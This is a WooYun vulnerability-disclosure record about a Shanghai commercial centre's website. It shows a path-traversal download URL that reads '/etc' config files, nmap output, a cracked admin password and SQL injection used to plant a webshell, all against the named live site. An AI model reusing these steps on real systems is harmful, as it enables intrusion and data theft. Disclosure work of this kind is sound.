{"id": 49013, "wybug_id": "wooyun-2014-080719", "wybug_title": "上海商城任意文件下载可webshell", "wybug_corp": "上海商城", "wybug_author": "feix", "wybug_date": "2014-10-25 21:39", "wybug_open_date": "2014-12-09 21:40", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-25：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-12-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 任意文件下载，泄漏数据库，获取webshell 详细说明：  www.shanghaicentre.com/download.php?file=download.php\n\n对 file 参数没有做任何过滤,可以下载任意文件。include/config.php文件泄漏数据库配置和 smtp 配置(smtp 密码写在另一个php文件)\n\nnmap -A 192.241.162.27Nmap scan report for www.shanghaicentre.com (192.241.162.27)Host is up (0.26s latency).Not shown: 995 closed portsPORT     STATE SERVICE VERSION21/tcp   open  ftp     vsftpd 2.2.222/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)873/tcp  open  rsync   (protocol version 30)3306/tcp open  mysql   MySQL (unauthorized)Service Info: OS: Unix开了 rsync，直接连连不上去，下载配置文件看看，www.shanghaicentre.com/download.php?file=../../../etc/rsyncd/rsyncd.conflog file = /var/log/rsync.log下载rsync.log，发现管理后台 www.shanghaicentre.com/vadmin/ 和数据库备份文件路径\n\nmd5跑一下，密码设置的很简单，进入管理后台，http://www.shanghaicentre.com/vadmin/admin_edit.php?a_id=1\n\n其中 a_id 没有过滤，可注入写文件，获取 webshell。   漏洞证明：  \n\n   修复方案：  对所有 download.php 里 file 参数进行过滤   版权声明：转载请注明来源 feix@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-12-10 03:21 |    \t\tRainism \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | hacking for fun)\t\t \n  洞主好细心    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}